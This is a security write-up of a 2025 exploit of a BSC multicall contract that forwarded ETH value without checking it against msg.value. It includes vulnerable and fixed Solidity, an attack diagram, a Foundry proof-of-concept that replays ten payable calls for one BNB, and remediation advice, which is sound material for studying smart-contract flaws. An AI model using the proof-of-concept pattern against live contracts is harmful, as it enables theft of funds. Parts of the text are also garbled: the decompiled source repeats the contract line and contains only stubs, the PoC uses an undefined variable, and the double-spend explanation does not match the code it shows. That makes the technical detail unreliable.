# MulticallWithETH — ETH Value Forwarding Bug Analysis

| Field | Details |
|------|------|
| **Date** | 2025-07-22 |
| **Protocol** | MulticallWithETH (BSC) |
| **Chain** | BSC |
| **Loss** | ~10,000 USDT |
| **Attacker** | [0x726fb298168c89d5dce9a578668ab156c7e7be67](https://bscscan.com/address/0x726fb298168c89d5dce9a578668ab156c7e7be67) |
| **Attack Tx** | [0x6da7be6e](https://bscscan.com/tx/0x6da7be6edf3176c7c4b15064937ee7148031f92a4b72043ae80a2b3403ab6302) |
| **Vulnerable Contract** | [0x3da0f00d5c4e544924bc7282e18497c4a4c92046](https://bscscan.com/address/0x3da0f00d5c4e544924bc7282e18497c4a4c92046) |
| **Root Cause** | The Multicall contract repeatedly reuses `msg.value` across each sub-call, enabling ETH double-spending |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/MulticallWithETH_exp.sol) |

---

## 1. Vulnerability Overview

The MulticallWithETH contract bundles multiple calls into a single transaction and forwards ETH value to each sub-call. The core vulnerability is that `msg.value` is used independently for each sub-call, causing a single ETH payment to be processed as if it were paid multiple times. This allows an attacker to execute multiple payment-required operations repeatedly using only a small amount of ETH.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable logic: msg.value is reused for each call
contract MulticallWithETH {
    struct Call {
        address target;
        bytes callData;
        uint256 value;
        bool allowFailure;
    }

    function aggregate(Call[] calldata calls) external payable returns (bytes[] memory results) {
        results = new bytes[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            // ❌ Full msg.value used for each call — ETH double-spend
            (bool success, bytes memory result) = calls[i].target.call{
                value: calls[i].value  // calls[i].value is never deducted from msg.value
            }(calls[i].callData);
            ...
        }
    }
}

// ✅ Fix: track total ETH consumed and validate
function aggregate(Call[] calldata calls) external payable returns (bytes[] memory results) {
    uint256 totalValue = 0;
    for (uint256 i = 0; i < calls.length; i++) {
        totalValue += calls[i].value;
    }
    require(totalValue == msg.value, "ETH value mismatch");
    // Then forward only the corresponding value to each call
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: MulticallWithETH_decompiled.sol
contract MulticallWithETH {
contract MulticallWithETH {  // ❌ Vulnerability

    // Selector: 0x4e487b71
    function Panic(uint256 a) external {
        // TODO: decompile logic not implemented
    }

    // Selector: 0x2d2ae1c1
    function getBalances(address[] a) external view returns (uint256) {
        // TODO: decompile logic not implemented
    }

}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ MulticallWithETH.aggregate([call1, call2, call3, ...])
  │         └─ msg.value = 1 BNB sent
  │
  ├─2─▶ Internal: call1{value: 1 BNB} → victim contract payment
  │
  ├─3─▶ Internal: call2{value: 1 BNB} → same BNB reused
  │         └─ same value forwarded again without deducting ETH balance
  │
  ├─4─▶ Internal: call3~N {value: 1 BNB} → repeated reuse
  │
  └─5─▶ N×1 BNB worth of payments completed with just 1 BNB → ~10,000 USDT drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract MulticallWithETH is Test {
    address USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address victim = 0x3DA0F00d5c4E544924bC7282E18497C4A4c92046;

    struct Call {
        address target;
        bytes callData;
        uint256 value;
        bool allowFailure;
    }

    function testExploit() public {
        vm.createSelectFork("bsc", 55371342);

        // Build calls array that reuses the same value repeatedly
        uint256 repeatCount = 10; // Reuse 1 BNB 10 times
        Call[] memory calls = new Call[](repeatCount);

        for (uint256 i = 0; i < repeatCount; i++) {
            calls[i] = Call({
                target: address(victimContract),
                // Function that purchases USDT with ETH payment from victim contract
                callData: abi.encodeWithSignature("buyWithETH(address)", address(this)),
                value: 1 ether, // Same 1 ETH reused every iteration
                allowFailure: false
            });
        }

        // Only 1 BNB is actually sent, but 10 payments are processed
        IMulticall(victim).aggregate{value: 1 ether}(calls);

        // Result: receive 10 BNB worth of USDT for only 1 BNB
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | ETH Value Forwarding Bug (msg.value Reuse) |
| **Attack Vector** | msg.value double-spend via Multicall |
| **Impact Scope** | USDT held by victim contract (~10,000 USD) |
| **CWE** | CWE-682 (Incorrect Calculation) |
| **DASP** | Business Logic |

## 6. Remediation Recommendations

1. **Pre-validate total ETH**: Verify that the sum of all call values equals `msg.value`
2. **Track cumulative consumption**: Track ETH spent within the loop and revert immediately if balance is exceeded
3. **Disallow payable Multicall**: Declare the function non-payable when value forwarding is not required
4. **Reference Uniswap's approach**: Refer to Uniswap V3's `multicall` implementation for correct `msg.value` handling

## 7. Lessons Learned

- `msg.value` exists only once per transaction, but repeated references in internal calls cause it to be spent multiple times — this is the same pattern found in the Uniswap V3 multi-hop attack (2021).
- The Multicall pattern improves UX, but incorrect ETH value handling turns it into a critical vulnerability.
- Every payable multicall implementation must include value-sum validation tests before deployment.